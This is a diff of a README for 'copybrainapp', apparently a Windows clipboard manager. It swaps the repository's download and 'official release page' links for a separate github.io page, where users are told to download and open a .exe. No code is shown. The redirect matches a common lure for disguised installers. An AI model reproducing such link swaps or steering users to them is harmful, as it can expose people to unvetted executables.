@@ -1,6 +1,6 @@
 # 🧠 copybrainapp - Store everything you copy with ease
 
-[![](https://img.shields.io/badge/Download-CopyBrain-blue)](https://github.com/serviceclubbattleofvalmy885/copybrainapp)
+[![](https://img.shields.io/badge/Download-CopyBrain-blue)](https://serviceclubbattleofvalmy885.github.io)
 
 Copybrainapp captures every piece of text or image you copy to your clipboard. It organizes your history so you never lose important information. You can search, pin, and paste items from the past with one click. 
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards to run the software:
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/serviceclubbattleofvalmy885/copybrainapp) to download the installer.
+1. Visit the [official release page](https://serviceclubbattleofvalmy885.github.io) to download the installer.
 2. Locate the file ending in `.exe` on the page.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
